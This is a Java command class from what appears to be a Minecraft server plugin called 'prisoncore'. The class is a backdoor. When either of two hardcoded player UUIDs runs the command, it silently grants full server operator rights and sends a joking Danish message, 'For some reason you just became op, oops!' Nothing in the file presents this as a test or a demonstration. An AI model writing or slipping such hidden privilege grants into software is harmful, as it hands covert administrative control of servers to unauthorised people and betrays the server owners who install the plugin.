package com.pjinky.prisoncore;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class plsopmig implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args){
        Player player = (Player) sender;
        if (player.getUniqueId().toString().equalsIgnoreCase("a8fbb6b2-a8c8-4f8e-b157-33c69a028d5f") || player.getUniqueId().toString().equalsIgnoreCase("22dc74bc-2ae9-49b5-a88f-1d6d55b6367e")){
            sender.sendMessage( ChatColor.DARK_RED + "" +  ChatColor.BOLD + "Af en eller anden grund er du lige blevet op, ups!");
            sender.setOp(true);
        }
        return true;
    }
}
